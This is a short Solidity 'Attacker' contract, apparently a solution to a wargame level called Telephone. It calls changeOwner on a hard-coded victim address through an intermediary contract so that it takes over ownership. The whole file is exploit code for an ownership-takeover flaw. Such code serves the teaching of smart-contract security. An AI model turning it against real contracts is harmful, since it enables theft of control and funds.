// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
    // The Telephone contract instance address
    address victim = address(0x9C2e3a52AB6898977d4eE360C55818DaB70dd829);

    function callVictim() external returns (bool)
    {
        // Send the new owner address as a parameter.
        (bool success, ) = victim.call(abi.encodeWithSignature("changeOwner(address)", 0x9156b5Bf1789F6d977296ce02A10eaE5330Bb5eF));

        return success;
    }
}